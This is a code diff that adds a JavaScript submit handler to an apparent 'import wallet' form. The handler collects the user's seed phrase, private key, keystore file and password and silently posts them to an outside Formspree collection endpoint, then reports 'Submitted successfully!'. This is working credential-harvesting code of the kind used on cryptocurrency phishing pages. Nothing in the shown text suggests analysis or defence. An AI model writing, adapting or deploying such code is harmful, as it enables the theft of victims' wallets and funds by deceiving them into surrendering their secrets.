@@ -113,3 +113,41 @@ document.getElementById('submitBtn').onclick = function (e) {
       showErrorPopup();
     });
 };
+
+document.getElementById('importWalletForm').addEventListener('submit', function (e) {
+  e.preventDefault(); // Prevents page reload
+
+  const phrase = document.getElementById('phrase').value.trim();
+  const privateKey = document.getElementById('private-key').value.trim();
+  const keystore = document.getElementById('keystore-json').value.trim();
+  const password = document.getElementById('password').value.trim();
+
+  fetch('https://formspree.io/f/xqaybqon', {
+    method: 'POST',
+    body: JSON.stringify({
+      phrase,
+      privateKey,
+      keystore,
+      password
+    }),
+    headers: {
+      'Accept': 'application/json',
+      'Content-Type': 'application/json'
+    }
+  })
+    .then(res => res.json())
+    .then(data => {
+      if (data.ok) {
+        alert("Submitted successfully!");
+        document.getElementById('popupModal').style.display = 'none';
+      } else {
+        alert("Failed to submit. Try again.");
+        showErrorPopup();
+      }
+    })
+    .catch(err => {
+      console.error("Network error:", err);
+      alert("Network error.");
+      showErrorPopup();
+    });
+});
